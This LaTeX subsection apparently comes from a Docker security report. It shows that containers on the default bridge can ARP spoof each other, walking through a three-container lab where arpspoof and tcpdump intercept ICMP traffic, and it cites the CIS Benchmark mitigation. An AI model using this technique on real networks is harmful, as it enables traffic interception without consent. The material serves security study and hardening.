\subsection{ARP Spoofing}\label{subsection:arp-spoofing}
By default, all Docker containers are added to the same bridge network. This means they are able to reach each other. By default, Docker containers also receive the \lstinline{CAP_NET_RAW} capability, which allows them to create raw packets. This means that by default, containers are able to ARP spoof other containers~\cite{Abusing-Containers}.\footnote{IPv4 forwarding is enabled by default by Docker.}

\medskip

Let's take a look at a practical example. Let's say we have three containers. One container will ping another container. A third malicious container wants to intercept the \lstinline{ICMP} packets.

We start three Docker containers using the \lstinline{ubuntu:latest} image (which is the same as \lstinline{ubunut:bionic-20191029} at the time of writing). They have the following names, IPv4 addresses and MAC addresses:
\begin{itemize}
    \item \lstinline{victim0}: \lstinline{172.17.0.2} and \lstinline{02:42:ac:11:00:02}
    \item \lstinline{victim1}: \lstinline{172.17.0.3} and \lstinline{02:42:ac:11:00:03}
    \item \lstinline{attacker}: \lstinline{172.17.0.4} and \lstinline{02:42:ac:11:00:04}
\end{itemize}

We shorten their names to \lstinline{vic0}, \lstinline{vic1} and \lstinline{atck}, respectively, instead of \lstinline{cont} to indicate in which container a command is executed.

\begin{lstlisting}[caption={Docker container ARP spoof},captionpos=b]
(host)$ docker run --rm -it --name=victim0 -h victim0 ubuntu:latest /bin/bash
(vic0)# apt update
...
(vic0)# apt install net-tools iproute2 iputils-ping
...
(host)$ docker run --rm -it --name=victim1 -h victim1 ubuntu:latest /bin/bash
(host)$ docker run --rm -it --name=attacker -h attacker ubuntu:latest /bin/bash
(atck)# apt update
...
(atck)# apt install dsniff net-tools iproute2 tcpdump
...
(atck)# arpspoof -i eth0 -t 172.17.0.2 172.17.0.3
...
(vic0)# arp
arp
172.17.0.3 ether 02:42:ac:11:00:04 C eth0
...
172.17.0.4 ether 02:42:ac:11:00:04 C eth0
(vic0)# ping 172.17.0.3
...
(atck)# tcpdump -vni eth0 icmp
...
10:16:18.368351 IP (tos 0x0, ttl 63, id 52174, offset 0, flags [DF], proto ICMP (1), length 84)
    172.17.0.2 > 172.17.0.3: ICMP echo request, id 898, seq 5, length 64
10:16:18.368415 IP (tos 0x0, ttl 64, id 8188, offset 0, flags [none], proto ICMP (1), length 84)
    172.17.0.3 > 172.17.0.2: ICMP echo reply, id 898, seq 5, length 64
...
\end{lstlisting}

We first start three containers and install dependencies. We then start to poison the ARP table of \lstinline{victim0}. We can observe this by looking at the ARP table of \lstinline{victim0} (with the \lstinline{arp} command). We see that the entries for \lstinline{172.17.0.3} and \lstinline{172.17.0.4} are the same (\lstinline{02:42:ac:11:00:04}). If we then start pinging \lstinline{victim1} from \lstinline{victim0} and looking at the \lstinline{ICMP} traffic on \lstinline{attacker}, we see that the \lstinline{ICMP} packets are routed through \lstinline{attacker}.

\medskip

Disabling inter-container communication by default is covered in the CIS Docker Benchmark by guideline 2.1 (Ensure network traffic is restricted between containers on the default bridge).

We would like to note that \lstinline{ARP} spoofing is invasive and could stability of a network with containers. This should only be done during a penetration test with the explicit permission of the owner of a network.
